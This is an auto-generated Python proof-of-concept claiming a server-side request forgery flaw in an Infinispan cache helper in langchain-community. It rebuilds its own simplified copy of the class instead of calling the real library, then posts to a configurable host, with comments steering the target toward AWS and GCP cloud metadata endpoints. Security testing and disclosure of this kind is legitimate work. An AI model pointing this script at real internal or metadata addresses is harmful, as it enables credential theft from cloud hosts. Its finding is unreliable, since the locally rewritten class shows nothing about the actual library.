#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-011
# Sink: cache_post
# Auto-generated — run with: python3 ssrf_sink_function_cache_post_cache_post.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Infinispan cache_post in langchain-community-only

Vulnerability: The Infinispan helper class constructs a URL from user-controlled
_default_node (set via constructor) and _cache_url (fixed path). No validation
is performed on the host/URL. An attacker can set _default_node to an internal
IP (e.g., cloud metadata endpoint) and trigger SSRF. The response is returned
to the caller.

This PoC demonstrates the SSRF by:
1. Creating an instance of the Infinispan class with a malicious _default_node
2. Calling cache_post with a benign payload
3. Showing the response from the internal endpoint

Safe by default: Uses a benign internal endpoint (http://127.0.0.1:9999/test)
that will likely fail, demonstrating the SSRF vector without harm.
"""

import requests
import sys
from typing import Optional

# Configuration - change these to test against different targets
TARGET_HOST = "http://127.0.0.1:9999"  # Benign default - change to internal IP
CACHE_NAME = "test-cache"
REST_TIMEOUT = 10


class Infinispan:
    """
    Simplified version of the vulnerable Infinispan helper class.
    Only includes the relevant methods for the SSRF exploit.
    """

    def __init__(self, ispn_nodes: list):
        """
        Constructor - sets _default_node from user input without validation.
        This is the entry point for the SSRF attack.
        """
        if not ispn_nodes:
            raise ValueError("ispn_nodes cannot be empty")
        # VULNERABLE: No validation on the host/URL
        self._default_node = ispn_nodes[0]
        # Fixed path used in URL construction
        self._cache_url = "/rest/v2/caches"
        self._entity_name = "default_entity"

    def cache_post(self, name: str, config: str) -> requests.Response:
        """
        Sink function - constructs URL from _default_node and _cache_url.
        No validation on the constructed URL.
        """
        # VULNERABLE: Direct string concatenation without validation
        api_url = self._default_node + self._cache_url + "/" + name
        print(f"[*] Constructed URL: {api_url}")

        response = requests.post(
            api_url,
            config,
            headers={"Content-Type": "application/json"},
            timeout=REST_TIMEOUT,
        )
        return response

    def cache_create(self, config: str = "") -> requests.Response:
        """
        Creates a cache - calls cache_post with the cache name.
        """
        return self.cache_post(CACHE_NAME, config)


def exploit_ssrf(target_host: str) -> Optional[str]:
    """
    Demonstrates SSRF by creating an Infinispan instance with a malicious
    _default_node and triggering a request to that host.

    Args:
        target_host: The internal host to target (e.g., http://169.254.169.254)

    Returns:
        Response text if successful, None otherwise
    """
    print(f"[*] Attempting SSRF to: {target_host}")

    # Create Infinispan instance with attacker-controlled _default_node
    # This is the entry point - ispn_nodes is user-controlled
    ispn = Infinispan([target_host])

    # Benign payload - just a simple JSON config
    benign_config = '{"distributed-cache": {"mode": "SYNC"}}'

    try:
        # Trigger the SSRF via cache_post
        response = ispn.cache_post(CACHE_NAME, benign_config)

        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")
        print(f"[*] Response body (first 500 chars): {response.text[:500]}")

        return response.text

    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
        print("[*] This is expected if the target host is not reachable.")
        return None
    except requests.exceptions.Timeout as e:
        print(f"[!] Timeout error: {e}")
        return None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return None


def main():
    """
    Main function - demonstrates the SSRF vulnerability.
    """
    print("=" * 60)
    print("SSRF Proof-of-Concept for langchain-community-only")
    print("=" * 60)
    print()
    print(f"[*] Target host: {TARGET_HOST}")
    print(f"[*] Cache name: {CACHE_NAME}")
    print()

    # Demonstrate the SSRF
    result = exploit_ssrf(TARGET_HOST)

    if result:
        print("\n[+] SSRF successful! Response received from internal endpoint.")
    else:
        print("\n[-] SSRF attempt completed (may have failed if target unreachable).")
        print("[*] To test against a real internal endpoint, change TARGET_HOST.")
        print("[*] Example: TARGET_HOST = 'http://169.254.169.254' (AWS metadata)")
        print("[*] Example: TARGET_HOST = 'http://metadata.google.internal' (GCP metadata)")

    print()
    print("=" * 60)
    print("Exploit demonstration complete.")
    print("=" * 60)


if __name__ == "__main__":
    main()
